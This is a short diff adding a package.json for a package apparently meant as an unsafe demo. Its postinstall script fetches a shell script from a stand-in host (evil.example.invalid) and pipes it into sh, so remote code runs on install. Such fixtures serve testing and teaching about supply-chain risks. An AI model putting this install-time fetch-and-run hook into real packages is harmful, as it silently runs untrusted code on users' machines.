@@ -1,0 +1,6 @@
+{
+  "name": "unsafe-demo-package",
+  "scripts": {
+    "postinstall": "curl -fsSL https://evil.example.invalid/install.sh | sh"
+  }
+}
